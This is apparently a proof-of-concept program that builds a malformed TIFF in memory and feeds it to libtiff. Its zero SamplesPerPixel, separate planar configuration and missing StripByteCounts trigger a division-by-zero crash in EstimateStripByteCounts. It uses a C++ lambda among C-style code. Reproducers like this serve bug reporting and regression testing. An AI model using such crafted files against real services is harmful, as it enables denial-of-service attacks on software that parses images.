#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <tiffio.h>

/* Simple in-memory file implementation for libtiff */
typedef struct {
    const unsigned char *data;
    toff_t size;
    toff_t off;
} MemFile;

static tmsize_t mem_read(thandle_t h, void *buf, tmsize_t size) {
    MemFile *mf = (MemFile *)h;
    if (size <= 0) return 0;
    if (mf->off >= mf->size) return 0;
    toff_t avail = mf->size - mf->off;
    tmsize_t n = (tmsize_t)(avail < (toff_t)size ? avail : (toff_t)size);
    memcpy(buf, mf->data + mf->off, (size_t)n);
    mf->off += n;
    return n;
}

static tmsize_t mem_write(thandle_t h, void *buf, tmsize_t size) {
    (void)h; (void)buf; (void)size;
    errno = EBADF;
    return -1; /* read-only */
}

static toff_t mem_seek(thandle_t h, toff_t off, int whence) {
    MemFile *mf = (MemFile *)h;
    toff_t newoff = 0;
    if (whence == SEEK_SET) newoff = off;
    else if (whence == SEEK_CUR) newoff = mf->off + off;
    else if (whence == SEEK_END) newoff = mf->size + off;
    else return (toff_t)-1;
    if (newoff < 0) return (toff_t)-1;
    mf->off = newoff;
    return mf->off;
}

static int mem_close(thandle_t h) {
    (void)h; return 0;
}

static toff_t mem_size(thandle_t h) {
    MemFile *mf = (MemFile *)h;
    return mf->size;
}

static int mem_map(thandle_t h, void **base, toff_t *size) {
    (void)h; (void)base; (void)size;
    return 0; /* no mapping */
}

static void mem_unmap(thandle_t h, void *base, toff_t size) {
    (void)h; (void)base; (void)size;
}

int main(void) {
    /*
     * Minimal classic little-endian TIFF with:
     * - PlanarConfiguration = SEPARATE (2)
     * - SamplesPerPixel = 0 (invalid)
     * - StripOffsets present
     * - StripByteCounts missing (to trigger EstimateStripByteCounts)
     */

    /* Build the TIFF file in memory. */
    unsigned char tiff[256];
    memset(tiff, 0, sizeof(tiff));

    /* Header at offset 0 */
    tiff[0] = 'I'; tiff[1] = 'I';              /* Little endian */
    tiff[2] = 42;  tiff[3] = 0;                /* Magic 42 */
    tiff[4] = 8;   tiff[5] = 0; tiff[6] = 0; tiff[7] = 0; /* IFD offset = 8 */

    /* IFD at offset 8 */
    size_t ifd_off = 8;
    tiff[ifd_off + 0] = 9; tiff[ifd_off + 1] = 0; /* 9 entries */

    /* Helper to write an IFD entry at index i (0-based) */
    auto write_entry = [&](int i, uint16_t tag, uint16_t type, uint32_t count, uint32_t value) {
        size_t e = ifd_off + 2 + (size_t)i * 12;
        tiff[e + 0] = (unsigned char)(tag & 0xFF);
        tiff[e + 1] = (unsigned char)((tag >> 8) & 0xFF);
        tiff[e + 2] = (unsigned char)(type & 0xFF);
        tiff[e + 3] = (unsigned char)((type >> 8) & 0xFF);
        tiff[e + 4] = (unsigned char)(count & 0xFF);
        tiff[e + 5] = (unsigned char)((count >> 8) & 0xFF);
        tiff[e + 6] = (unsigned char)((count >> 16) & 0xFF);
        tiff[e + 7] = (unsigned char)((count >> 24) & 0xFF);
        tiff[e + 8] = (unsigned char)(value & 0xFF);
        tiff[e + 9] = (unsigned char)((value >> 8) & 0xFF);
        tiff[e + 10] = (unsigned char)((value >> 16) & 0xFF);
        tiff[e + 11] = (unsigned char)((value >> 24) & 0xFF);
    };

    /* Entries: tag, type, count, value/offset */
    /* 0: ImageWidth (256), LONG=4, 1, 1 */
    write_entry(0, 0x0100, 4, 1, 1);
    /* 1: ImageLength (257), LONG=4, 1, 1 */
    write_entry(1, 0x0101, 4, 1, 1);
    /* 2: BitsPerSample (258), SHORT=3, 1, 8 (packed in value field) */
    write_entry(2, 0x0102, 3, 1, 8);
    /* 3: Compression (259), SHORT=3, 1, 1 (no compression) */
    write_entry(3, 0x0103, 3, 1, 1);
    /* 4: PhotometricInterpretation (262), SHORT=3, 1, 1 (min-is-black) */
    write_entry(4, 0x0106, 3, 1, 1);
    /* 5: StripOffsets (273), LONG=4, 1, 200 */
    write_entry(5, 0x0111, 4, 1, 200);
    /* 6: SamplesPerPixel (277), SHORT=3, 1, 0 (malformed) */
    write_entry(6, 0x0115, 3, 1, 0);
    /* 7: RowsPerStrip (278), LONG=4, 1, 1 */
    write_entry(7, 0x0116, 4, 1, 1);
    /* 8: PlanarConfiguration (284), SHORT=3, 1, 2 (SEPARATE) */
    write_entry(8, 0x011C, 3, 1, 2);

    /* Next IFD offset = 0 */
    size_t next_ifd_off = ifd_off + 2 + 9 * 12;
    tiff[next_ifd_off + 0] = 0;
    tiff[next_ifd_off + 1] = 0;
    tiff[next_ifd_off + 2] = 0;
    tiff[next_ifd_off + 3] = 0;

    /* Dummy image data at offset 200 (just a few bytes) */
    tiff[200] = 0xAA;
    tiff[201] = 0xBB;
    tiff[202] = 0xCC;
    tiff[203] = 0xDD;

    MemFile mf;
    mf.data = tiff;
    mf.size = (toff_t)sizeof(tiff);
    mf.off = 0;

    TIFF *tif = TIFFClientOpen("mem", "r", (thandle_t)&mf,
                               mem_read, mem_write, mem_seek, mem_close,
                               mem_size, mem_map, mem_unmap);
    if (!tif) {
        fprintf(stderr, "Failed to open in-memory TIFF\n");
        return 1;
    }

    /* Force reading of the first directory, which will try to estimate strip byte counts
       because StripByteCounts is missing. With PlanarConfig=SEPARATE and SamplesPerPixel=0,
       this triggers a division by zero inside EstimateStripByteCounts. */
    int ok = TIFFReadDirectory(tif);
    /* If the bug is present, the program should crash before reaching here with SIGFPE. */
    fprintf(stderr, "TIFFReadDirectory returned %d (unexpected if bug triggers)\n", ok);

    TIFFClose(tif);
    return 0;
}
